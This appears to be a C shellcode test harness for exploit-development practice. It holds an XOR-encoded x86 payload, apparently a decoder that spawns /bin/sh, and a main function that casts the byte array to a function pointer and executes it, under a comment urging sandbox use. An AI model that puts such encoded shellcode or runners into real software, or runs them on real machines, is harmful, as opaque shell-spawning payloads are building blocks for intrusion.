#include <stdio.h>
#include <string.h>

/**
	REMEMBER THAT SHELLCODE FROM ONLINE IS NEVER TRUSTED, 
	ALWAYS RUN IT IN A VIRTUAL ENVIRONMENT AND NOT YOUR ACTUAL MACHINE
	AKA A TESTING SANDBOX 
*/

unsigned char code[] = \
"\xeb\x0c\x5e\x80\x36\xbb\x74\x0b\x80\x36\xaa\x46\xeb\xf5\xe8\xef\xff\xff\xff\x20\xd1\x41\x79\x7f\x3e\x62\x79\x79\x3e\x3e\x73\x78\x98\xf2\x41\x98\xf3\x42\x98\xf0\xa1\x1a\xdc\x91\xbb";

int main(int argc, char** argv)
{
	printf("Shellcode Length: %d\n", strlen(code));
	
	// define a pointer to a type int function name ret, and it takes no arguments
	// initialize it to a type int function pointer that takes no arguments casted on shellcode

	int (*ret)() = (int(*)())code;

	// running the pointer function
	ret();

	return 0;
}
